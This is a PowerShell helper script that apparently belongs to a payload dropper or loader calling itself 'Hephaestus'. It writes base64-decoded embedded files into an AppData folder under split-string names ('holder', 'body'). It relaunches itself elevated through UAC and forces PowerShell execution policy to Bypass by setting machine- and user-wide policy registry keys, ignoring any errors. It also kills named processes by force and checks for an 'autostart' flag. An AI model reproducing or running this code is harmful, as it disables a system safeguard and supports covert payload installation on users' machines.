
function IsDebug {
    $debugFile = "C:\debug.txt"
    
    try {
        # Check if the file exists
        if (Test-Path $debugFile -PathType Leaf) {
            return $true
        } else {
            return $false
        }
    } catch {
        # Catch any errors that occur during the Test-Path operation
        return $false
    }
}


$globalDebug = IsDebug;

function writedbg {
    param (
        [string]$msg,   [string]$msg2=""
    )
        if ($globalDebug){
            Write-Host $msg + $msg2
        }
}

function Utf8NoBom {
    param (
        [string]$data,
        [string]$file
    )

    # Create a StreamWriter to write without BOM
    $streamWriter = [System.IO.StreamWriter]::new($file, $false, [System.Text.Encoding]::UTF8)
    $streamWriter.Write($data)
    $streamWriter.Close()

    # Forcefully overwrite the file to ensure no BOM is present
    # Read back the written file as byte array
    $writtenContent = [System.IO.File]::ReadAllBytes($file)

    # Check for BOM (UTF-8 BOM is 0xEF, 0xBB, 0xBF)
    if ($writtenContent.Length -ge 3 -and $writtenContent[0] -eq 0xEF -and $writtenContent[1] -eq 0xBB -and $writtenContent[2] -eq 0xBF) {
        # Remove the BOM bytes
        $writtenContent = $writtenContent[3..($writtenContent.Length - 1)]
    }

    # Write back the content without BOM
    [System.IO.File]::WriteAllBytes($file, $writtenContent)
}


function Get-HephaestusFolder {
    $appDataPath = [System.Environment]::GetFolderPath('ApplicationData')
    $HephaestusFolder = Join-Path $appDataPath 'Hephaestus'
    return $HephaestusFolder
}

function Get-HephaestusPath {
    $HephaestusFolder = Get-HephaestusFolder
    $scriptName = 'holder' + '.' + 'ps1'
    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
    return $HephaestusPath
}

function Get-BodyPath {
    $HephaestusFolder = Get-HephaestusFolder
    $scriptName = 'body' + '.' + 'ps1'
    $HephaestusPath = Join-Path $HephaestusFolder $scriptName
    return $HephaestusPath
}



function ExtractEmbedding {
    param (
        [string]$inContent,
        [string]$outFile
    )
    $decodedBytes = [Convert]::FromBase64String($inContent)
    [System.IO.File]::WriteAllBytes($outFile, $decodedBytes)
}

function Test-Arg{ param ([string]$arg)
    $srcArgs = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
    $srcArgs += $MyInvocation.UnboundArguments
    $argString = $srcArgs -join ' '
    if ($argString -like "*$arg*")
    {
        return $true;
    }
    return $false
} 

function Test-Autostart 
{
    return Test-Arg -arg "autostart"
}
function Test-Gui
{
    return Test-Arg -arg "guimode"
}

function ReRun {
    param ([string]$arg, [bool]$uac)
    $localArguments = $MyInvocation.BoundParameters.GetEnumerator() | ForEach-Object { "-$($_.Key) `"$($_.Value)`"" }
    $localArguments += $MyInvocation.UnboundArguments
    if (-not [string]::IsNullOrEmpty($string)) {
        $localArguments += "-$arg"
    }
    $localArgumentList = @("-File", $MyInvocation.MyCommand.Path) + $localArguments
    if ($uac -eq $true)
    {
        Start-Process powershell.exe -ArgumentList $localArgumentList -Verb RunAs
    }
    else {
        Start-Process powershell.exe -ArgumentList $localArgumentList
    }
    exit
}


function Elevate()
{ 
  if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator))
  {
      ReRun -arg "" -uac $true
      exit
  }

  try {
    $registryPath = "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

  if (-not (Test-Path $registryPath)) {
      New-Item -Path $registryPath -Force
  }
  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
  Write-Host "Registry values have been set successfully."
  }
  catch {

  }

  try {
    $registryPath = "HKCU:\SOFTWARE\Policies\Microsoft\Windows\PowerShell"

  if (-not (Test-Path $registryPath)) {
      New-Item -Path $registryPath -Force
  }
  Set-ItemProperty -Path $registryPath -Name "EnableScripts" -Value 1 -Type DWord
  Set-ItemProperty -Path $registryPath -Name "ExecutionPolicy" -Value "Bypass" -Type String
  Write-Host "Registry values have been set successfully."
  }
  catch {

  }

  try {
    Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force;
  }
  catch { 
  }

  try {
    Set-ExecutionPolicy -Scope LocalMachine -ExecutionPolicy Bypass -Force;
  }
  catch {
  }
}

function Get-EnvPaths {
    $a = Get-LocalAppDataPath
    $b =  Get-AppDataPath
    return @($a , $b)
}

function Get-TempFile {
    $tempPath = [System.IO.Path]::GetTempPath()
    $tempFile = [System.IO.Path]::GetTempFileName()
    return $tempFile
}

function Get-LocalAppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::LocalApplicationData)
}

function Get-AppDataPath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::ApplicationData)
}

function Get-ProfilePath {
    return [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
}

function Close-Processes {
    param (
        [string[]]$processes
    )

    foreach ($process in $Processes) {
        $command = "taskkill.exe /im $process /f"
        Invoke-Expression $command
    }
}